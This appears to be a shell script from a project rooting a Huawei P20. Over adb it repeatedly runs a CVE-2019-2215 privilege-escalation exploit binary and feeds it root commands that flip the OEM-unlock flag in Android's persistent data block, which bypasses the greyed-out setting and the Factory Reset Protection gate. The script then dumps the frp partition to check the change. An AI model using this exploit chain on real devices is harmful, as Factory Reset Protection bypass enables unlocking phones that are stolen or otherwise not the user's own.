#!/bin/bash
# The bootloader's "FRP" gate is the AOSP PersistentDataBlock's OEM-unlock flag.
# Our frp dump contains PDB_MAGIC (0x73189019 at offset 0x20), so this device uses
# the persistent data block, and the flag lives there.
#
# With no oemlock HAL present, OemLockService falls back to exactly this -
# PersistentDataBlockManager.setOemUnlockEnabled() - which is what the greyed
# toggle would call. As root we can call the service directly:
#   transaction 6 = setOemUnlockEnabled(boolean)
#   transaction 7 = getOemUnlockEnabled()
set -u
cd /home/placeless/dev/p20-root

cat > /tmp/pdb.sh <<'INNER'
id
echo "=== current:"
service call persistent_data_block 7
echo "=== setting to 1:"
service call persistent_data_block 6 i32 1
echo "=== read back:"
service call persistent_data_block 7
echo "=== done ==="
exit
INNER

for attempt in 1 2 3 4 5 6; do
  OUT=$(timeout 240 adb shell /data/local/tmp/cve-2019-2215 < /tmp/pdb.sh 2>&1 | tr -d '\000')
  if echo "$OUT" | grep -aq "=== done ==="; then
    echo "$OUT" | grep -aE "current:|setting|read back:|Result|result|done|uid=0|Exception|SecurityException" | head -20
    break
  fi
  echo "  [attempt $attempt lost the race]"; sleep 15
done

echo
echo "############ did the flag change in the partition? (dump frp again, compare)"
cat > /tmp/frp_after.sh <<'INNER'
dd if=/dev/block/bootdevice/by-name/frp of=/data/local/tmp/frp2.bin bs=4096
chmod 666 /data/local/tmp/frp2.bin
od -A x -t x1 -N 96 /data/local/tmp/frp2.bin
echo "=== done ==="
exit
INNER
for attempt in 1 2 3 4 5; do
  OUT=$(timeout 240 adb shell /data/local/tmp/cve-2019-2215 < /tmp/frp_after.sh 2>&1 | tr -d '\000')
  echo "$OUT" | grep -aq "=== done ===" && { echo "$OUT" | grep -aE "^00[0-9a-f]0" | head -8; break; }
  echo "  [attempt $attempt lost the race]"; sleep 15
done
echo "--- for reference, the original was:"
od -A x -t x1 -N 96 firmware/partitions/frp.bin | head -8
